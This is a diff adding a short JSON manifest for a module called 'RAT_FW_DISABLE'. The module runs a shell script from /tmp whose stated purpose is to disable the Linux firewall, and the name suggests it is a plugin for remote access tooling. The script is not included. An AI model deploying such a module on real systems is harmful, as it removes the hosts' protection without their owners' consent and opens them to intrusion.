@@ -1,0 +1,11 @@
+{
+	"name": "RAT_FW_DISABLE",
+	"version": "1.0.0.0",
+	"description": "Disables Linux Firewall",
+	"command": "sh /tmp/RAT_FW_DISABLE/RAT_FW_DISABLE.sh",
+	"log": "/tmp/RAT_FW_DISABLE/log",
+	"location": "/tmp/RAT_FW_DISABLE",
+	"timeout": "0",
+	"commandargs": "",
+	"execmode": "0"
+}
